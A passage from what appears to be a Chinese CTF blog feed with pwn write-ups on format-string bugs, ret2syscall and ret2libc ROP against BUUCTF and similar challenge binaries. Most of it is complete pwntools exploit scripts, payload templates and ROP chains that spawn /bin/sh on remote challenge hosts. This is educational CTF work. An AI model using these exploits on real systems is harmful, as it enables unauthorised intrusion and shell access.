泄露目标地址内容，假设偏移为offset<br>## 目标地址放前面<br>pad = p32(target_addr)+<span class="hljs-string">&quot;%&#123;&#125;$s&quot;</span>.format(offset).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>## 目标地址放后面<br>pad = <span class="hljs-string">&quot;%&#123;&#125;$s&quot;</span>.format(offset+<span class="hljs-number">1</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)+p32(target_addr)<br><br># 改写目标地址内容为value<br>## 目标地址放前面<br>pad = p32(target_addr)+<span class="hljs-string">&quot;%&#123;&#125;c%&#123;&#125;$n&quot;</span>.format(value<span class="hljs-number">-4</span>, offset).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>## 目标地址放后面，注意ljust补位的字符和offset+idx的位置要对应<br>pad = <span class="hljs-string">&quot;%&#123;&#125;c%&#123;&#125;$n&quot;</span>.format(value, offset+<span class="hljs-number">3</span>).ljust(<span class="hljs-number">4</span>*<span class="hljs-number">3</span>, <span class="hljs-string">&quot;a&quot;</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>pad += p32(target_addr)<br>#################### <br><br>#################### <span class="hljs-number">64</span>位<br># 求偏移<br>pad = <span class="hljs-string">&quot;aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...&quot;</span><br><br># 泄露目标地址内容，目标地址只能放后面，假设偏移为offset<br>pad = <span class="hljs-string">&quot;%&#123;&#125;$s&quot;</span>.format(offset+<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;a&quot;</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)+p64(target_addr)<br><br># 改写目标地址内容为value<br>## 目标地址只能放后面，注意ljust补位的字符和offset+idx的位置要对应<br>pad = <span class="hljs-string">&quot;%&#123;&#125;c%&#123;&#125;$lln&quot;</span>.format(value, offset+<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>*<span class="hljs-number">3</span>, <span class="hljs-string">&quot;a&quot;</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>pad += p64(target_addr)<br>#################### <br><br></code></pre></td></tr></table></figure><h2 id="例题-BUUCTF-jarvisoj-fm"><a href="#例题-BUUCTF-jarvisoj-fm" class="headerlink" title="例题 (BUUCTF jarvisoj_fm)"></a>例题 (BUUCTF jarvisoj_fm)</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>例行检查，32位，开启了canary和nx保护。</p><p>ida查看代码，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+7Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">be_nice_to_people</span>();<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(buf));<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>u);<br>  <span class="hljs-built_in">printf</span>(buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d!\n&quot;</span>, x);<br>  <span class="hljs-keyword">if</span> ( x == <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;running sh...&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在后门函数，printf(buf)属于格式化字符串漏洞。<br>程序大致意思就是要使x&#x3D;4，那么就能执行shell啦。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>计算偏移量</li></ul><p>根据步骤，我们先根据输入计算偏移量。</p><p>上面讲基础时的那张图就是这道题的偏移量计算过程。因此偏移量为11</p><ul><li>构造payload</li></ul><p>我们的目的是将x的值改为4，x的地址通过双击可以找到为0x0804A02C，可以构造payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span>=p32(x_addr)+<span class="hljs-string">&quot;%11$n&quot;</span><br></code></pre></td></tr></table></figure><p>首先传入x参数的地址，这个地址存放在栈上偏移为11的位置，利用%11$n，定位到了偏移为11的位置,往这个位置写入数据，写入的数据由%11$n前面的参数的长度决定，而x参数的地址正好是4位，不需要添a来补齐位数就可以直接利用，将x参数的地址的值改成了4，从而获取了shell</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node3.buuoj.cn&#x27;,25582)<br><span class="hljs-attribute">x_addr</span>=0x804A02C<br><br><span class="hljs-attribute">payload</span>=p32(x_addr)+b&quot;%11$n&quot;<br><br>r.sendline(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>根据上面整理的那种写法，payload也可以这样写：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-built_in">p32</span>(x_addr)+<span class="hljs-string">&quot;%&#123;&#125;$n&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-number">11</span>)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br></code></pre></td></tr></table></figure><p>通过这个简单的题目来理解一下格式化字符串漏洞，之后遇到更难的题目继续整理~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>格式化字符串漏洞的形式</li><li>利用该漏洞的步骤（注意32&#x2F;64位的区别）</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ret2syscall</title>
    <link href="/2023/09/20/Pwn%E2%80%94%E2%80%94ret2syscall/"/>
    <url>/2023/09/20/Pwn%E2%80%94%E2%80%94ret2syscall/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>控制程序执行系统调用，获取 shell</p><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode）</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>32位和64位的syscall原理都是一样，只有传参和调用存在差异，以下一起说，做个对比。</p><ul><li>32位系统调用使用 “ int 80h “</li><li>64位系统调用使用 “ syscall “ （汇编代码就是syscall 直接ROPgadget–only查找即可）</li></ul><p>32的系统调用号与64位的不大一样 使用的时候最好百度一下</p><ul><li>32位     #define __NR_execve 11</li><li>64位     #define __NR_execve 59   （0x3b）</li></ul><p>32位的系统调用号放在eax 传参依次是 <strong>EBX、ECX、EDX、ESI、EDI、EBP</strong><br>64位的系统调用号放在rax 传参依次是 <strong>RDI、RSI、RDX、R10、R8、R9</strong>  （和64位函数传参一样）</p><p><strong>构造ROP chain:</strong></p><ul><li>没有&#x2F;bin&#x2F;sh字眼 只能自己加到bss区域，然后调用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)</li></ul><p>查找bss：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">readelf</span> -S pwn  <br>或<br>gdb中使用vmmap<br></code></pre></td></tr></table></figure><p><img src="/images/pwn7-1.png"></p><p>例如上图中这一段有w（可写）权限的地址应该都可以。</p><ul><li>有&#x2F;bin&#x2F;sh，溢出成功后，通过寻找特定的寄存器，以寄存器承载特定的数据，构造 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) 的汇编实现，将其部署栈中，劫持控制流实现获取 shell。</li></ul><p>如何构造汇编实现？(64bit)</p><pre><code class="hljs">    execve(&quot;/bin/sh&quot;,NULL,NULL)    系统调用号，rax为59    第一个参数，rdi指向/bin/sh    第二个参数，为0    第三个参数，为0    第四个参数，为0    第五个参数，rsi为0    payload = &quot;A&quot;*offset(偏移量) + flat(rdi,bin_sh,rax_rdx_rbx,59,0,0,rsi,0,syscall)</code></pre><p>查找各寄存器地址：</p><pre><code class="hljs">    ROPgadget --binary ret2syscall --only &quot;syscall|ret&quot;    ROPgadget --binary ret2syscall --only &#39;pop|ret&#39; | grep &#39;rdx&#39;    #rdx=0x000000000040168b    </code></pre><h2 id="例题（https-oj-blue-whale-me-challenges-pwnalpha）"><a href="#例题（https-oj-blue-whale-me-challenges-pwnalpha）" class="headerlink" title="例题（https://oj.blue-whale.me/challenges#pwnalpha）"></a>例题（<a href="https://oj.blue-whale.me/challenges#pwnalpha%EF%BC%89">https://oj.blue-whale.me/challenges#pwnalpha）</a></h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>开启了NX保护，64位</p><p>nc一下：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">nc vps1.blue-whale.<span class="hljs-keyword">me</span> <span class="hljs-number">19900</span>                             <br>Hello brave new challenger<br>Any <span class="hljs-keyword">last</span> <span class="hljs-built_in">words</span>?<br>lll<br>This will be <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> thing <span class="hljs-keyword">that</span> you <span class="hljs-built_in">say</span>: lll<br><br>Alas, you had no luck today.<br></code></pre></td></tr></table></figure><p>从键盘输入，然后再输出。</p><p>拖进ida64看看，</p><p>这里打开ida以后出现了好多好多函数，但是没有main函数，想要快速找到主要函数可以查看String窗口并查找“Any last words”字符串，双击查看这个字符串是由什么函数使用的。用这个方法找到是sub_400B60()这个函数，f5看看这个函数的内容。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall sub<span class="hljs-constructor">_400B60(<span class="hljs-params">__int64</span> <span class="hljs-params">a1</span>, <span class="hljs-params">signed</span> <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>)</span><br>&#123;<br>  <span class="hljs-built_in">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-400h]</span><br><br>  sub<span class="hljs-constructor">_410390((<span class="hljs-params">signed</span> <span class="hljs-params">__int64</span>)</span><span class="hljs-string">&quot;Any last words?&quot;</span>, a2);<br>  sub<span class="hljs-constructor">_4498A0(0, &amp;<span class="hljs-params">buf</span>, 0x7D0uLL)</span>;<br>  return sub<span class="hljs-constructor">_40F710((<span class="hljs-params">__int64</span>)</span><span class="hljs-string">&quot;This will be the last thing that you say: %s\n&quot;</span>, &amp;buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>buf存在栈溢出。</p><p>再查看一下sub_4498A0(),发现其系统调用read函数</p><p><img src="/images/pwn7-2.png"></p><p>根据分析，知道read函数这里产生了栈溢出，根据read知道，会用到系统调用。这里开启了NX保护，不能直接往栈里写shellcode，可以通过系统调用execave函数来获得shell。即在返回地址处进行系统调用，来执行execave（’&#x2F;bin&#x2F;sh’，0，0）命令来获得shell。</p><p>根据上面总结的基础知识，execave的第一个参数（’&#x2F;bin&#x2F;sh’）放在rdi中，第二个和第三个参数0需放在rsi,rdx。系统调用号（59）存放在rax中 .</p><p>利用ROPgadget 分别查找pop_rdi，pop_rsi,pop_rdx，pop_raxd的地址。</p><p>由于程序中不存在“&#x2F;bin&#x2F;sh”,在这里需要用read函数将’&#x2F;bin&#x2F;sh’写入一个可写可执行段.bss段，根据上面提到的方法查找bss段。</p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-attribute">padding</span> + <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,bss_addr,<span class="hljs-built_in">len</span>(‘/bin/sh\x00’)) + sysread_id + syscall_addr +<span class="hljs-built_in">execave</span>(bss_addr,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) + sysexecave_id +syscall_addr<br></code></pre></td></tr></table></figure><p>可以与下面exp对照来看。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs smali">from pwn import *<br><br>r = remote(&#x27;vps1.blue-whale.me&#x27;,19900)<br><br>pop_rdi=0x0000000000400686<br>pop_rsi=0x00000000004101f3<br>pop_rdx=0x00000000004498b5<br>pop_rax=0x0000000000415664<br>syscall_addr = 0x0000000000474E65<br>bss_addr = 0x00000000006bb2e0<br><br>payload = b&#x27;a&#x27;*0x400 + b&#x27;b&#x27;*0x8 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(8) + p64(pop_rax) + p64(0) + p64(syscall_addr)<br><br>payload += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall_addr)<br><br>r.send(payload)<br>r.send(&#x27;/bin/sh\x00&#x27;)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>这里p64(pop_rax) + p64(0)应该对应的是read系统调用号。p64(pop_rax) + p64(59)对应64位程序系统调用号</p><p>附上系统调用号连接：<a href="https://filippo.io/linux-syscall-table/">https://filippo.io/linux-syscall-table/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ROP进阶练习</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E8%BF%9B%E9%98%B6%E7%BB%83%E4%B9%A0/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E8%BF%9B%E9%98%B6%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-OGeek2019-babyrop）"><a href="#例题（BUUCTF-OGeek2019-babyrop）" class="headerlink" title="例题（BUUCTF [OGeek2019]babyrop）"></a>例题（BUUCTF [OGeek2019]babyrop）</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/pwn5-1.png"></p><p>没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。</p><p>拖到ida观察，main函数中生成一个随机数，把这个随机数读入buf，buf作为参数传进sub_804871F()函数里，然后将该函数返回的结果作为参数再传进sub_80487D0()里</p><p>未发现system，binsh<br><img src="/images/pwn5-2.png"></p><p><strong>f2函数：</strong><br><img src="/images/pwn5-3.png"></p><p>终端输入0x20字节长的字符串到buf，buf数组长度为7，可以发生溢出，但溢出不到ret位置。<br>strcmp的特性是遇到’\0’就停止比较字符串，这里可以考虑0截断绕过。<br>最后函数把v5作为返回值。但是这个函数并没有对v5做出改动，结合栈图，可以猜测v5是被溢出改变了。</p><p><strong>f3函数：</strong></p><p><img src="/images/pwn5-4.png"><br>f3函数是把v5的值作为参数传入，进行条件判断运算。在第2个read中，只要a1足够大，就能发生栈溢出，并且能够溢出到ret位置。</p><p>这里的a1是上一个函数的返回值，看v5的地址，可以看到就在buf的地址里，我们只要在读入buf的时候将这个位置填上255（\xff），之后就会执行else，那么我们就可以对buf进行溢出了<br>buf数组长度为0x2c-0x25&#x3D;0x7</p><p><img src="/images/pwn5-5.png"></p><p>所以第一个payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload1</span> = b<span class="hljs-string">&quot;\x00&quot;</span> + b<span class="hljs-string">&quot;\xff&quot;</span>*(<span class="hljs-number">0</span>x2c-<span class="hljs-number">0</span>x25)<br></code></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>经过上面分析，找出了两个可以栈溢出的点。f3函数能让第二个read栈溢出成功的前提是传入的a1足够大，而v5就是a1。若要让v5足够大，在f2中必须溢出改变v5的值。若要能让f2成功返回v5，必须使用零截断绕过strncmp函数。</li><li>题目没有给出后门函数，这个二进制文件不是静态的，可以利用的gadget也不多。所以考虑使用retl2ibc构造system(“&#x2F;bin&#x2F;sh”)函数，这里利用write函数作为中间跳板获得其他函数的真实值。</li></ul><p>第二个payload主要对f3中的buf进行溢出，泄露libc地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload2=b&#x27;a&#x27;*(<span class="hljs-number">0</span>xe7+4)+p32(<span class="hljs-name">write_plt</span>)+p32(<span class="hljs-name">main</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">write_got</span>)+p32(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p>之后可以计算偏移量，构造rop。在这里我用题目给的libc文件打不通，并且main函数地址不能用elf.sym[“main”]，我也不知道为啥。最后还是用的LibcSearcher</p><p>第三个payload：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload3=b&#x27;a&#x27;*(<span class="hljs-number">0</span>xe7+4)+p32(<span class="hljs-name">system_addr</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">bin_sh</span>)<br></code></pre></td></tr></table></figure><h3 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,28508)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pwn&#x27;)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main = 0x08048825<br><br>payload1 = b<span class="hljs-string">&quot;\x00&quot;</span> + b<span class="hljs-string">&quot;\xff&quot;</span>*(0x2c-0x25)<br>r.sendline(payload1)<br>r.recvuntil(b<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-attribute">payload2</span>=b&#x27;a&#x27;*(0xe7+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)<br>r.sendline(payload2)<br><span class="hljs-attribute">write_addr</span>=u32(r.recv(4))<br><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">offset</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><span class="hljs-attribute">system_addr</span>=offset+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bin_sh</span>=offset+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>r.sendline(payload1)     #第二次发送payload1<br><br><span class="hljs-attribute">payload3</span>=b&#x27;a&#x27;*(0xe7+4)+p32(system_addr)+p32(0)+p32(bin_sh)<br><br>r.sendline(payload3)<br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>这里payload1是上传了两遍的，一开始没发现，导致卡了很久。。菜死我了orz</p><h2 id="例题2-（BUUCTF-bjdctf-2020-babyrop）"><a href="#例题2-（BUUCTF-bjdctf-2020-babyrop）" class="headerlink" title="例题2 （BUUCTF bjdctf_2020_babyrop）"></a>例题2 （BUUCTF bjdctf_2020_babyrop）</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>checksec，发现开了NX，是个64位程序。</p><p>拖到ida64，很简单一程序。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-built_in">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **envp</span>)</span><br>&#123;<br>  <span class="hljs-keyword">init</span>(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>vunl():</strong></p><p><img src="/images/pwn6-1.png"></p><p>buf存在栈溢出，根据题目也能看出来要泄露libc地址构造ROP。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>用<strong>puts</strong>函数找基址：</li></ul><p>可以与上面32位泄露做一个对比。这里用puts函数泄露（必须是已经调用过的函数）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts_plt=elf<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;puts&quot;</span>]</span><br>puts_got=elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;puts&quot;</span>]</span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br>pop_rdi_ret=<span class="hljs-number">0</span>x400733<br>main=elf<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;main&#x27;</span>]</span><br>start=<span class="hljs-number">0</span>x400530<br>ret=<span class="hljs-number">0</span>x400734<br>payload1=b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0</span>x28)+<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(puts_got)+<span class="hljs-built_in">p64</span>(puts_plt)+<span class="hljs-built_in">p64</span>(main)<br>#这里最后的<span class="hljs-built_in">p64</span>(main)也可以换成start的地址<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendline</span>(payload1)<br>puts=<span class="hljs-built_in">u64</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libcbase=puts-libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;puts&quot;</span>)<br>system=libcbase+libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;system&quot;</span>)<br>str_bin_sh=libcbase+libc<span class="hljs-selector-class">.dump</span>(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br></code></pre></td></tr></table></figure><p>利用溢出，pop rdi放入返回地址，返回时执行，把puts的got表地址返回到rdi里，接下来ret到puts plt，puts-plt则是执行puts函数，rdi里是puts got的地址，而这个地址又指向puts的真实地址。也就是说，puts put了自己的真实地址<br>payload1写好后发送，变量puts接收了真实地址。这里用了个ljust。puts地址前6个字节有效，所以最后得人为添加’\x00’补全8字节（这里其实我也没太明白6个字节有效）。</p><p>puts真实地址减去偏移地址得到基址，基址加system的偏移地址得到system的真实地址。</p><ul><li>执行system<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload2=b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0</span>x28)+<span class="hljs-built_in">p64</span>(pop_rdi_ret)+<span class="hljs-built_in">p64</span>(str_bin_sh)+<span class="hljs-built_in">p64</span>(system)+<span class="hljs-built_in">p64</span>(ret)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendline</span>(payload2)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.interactive</span>()<br></code></pre></td></tr></table></figure>这里我在system地址后面跟了一个ret地址作为system执行的地址，按我之前看过的资料来说确实需要加上，但这里不加也能打通，这里有点不懂了。</li></ul><h3 id="完整exp：-1"><a href="#完整exp：-1" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">p</span>=remote(&quot;node4.buuoj.cn&quot;,27918)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./bjdctf_2020_babyrop&quot;)<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>p.recvuntil(b<span class="hljs-string">&quot;story!\n&quot;</span>)<br><span class="hljs-attribute">pop_rdi_ret</span>=0x400733<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">start</span>=0x400530<br><span class="hljs-attribute">ret</span>=0x400734<br><span class="hljs-attribute">payload1</span>=b&quot;A&quot;*(0x28)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload1)<br><span class="hljs-attribute">puts</span>=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;puts&quot;,puts)<br><span class="hljs-attribute">libcbase</span>=puts-libc.dump(&quot;puts&quot;)<br><span class="hljs-attribute">system</span>=libcbase+libc.dump(&quot;system&quot;)<br><span 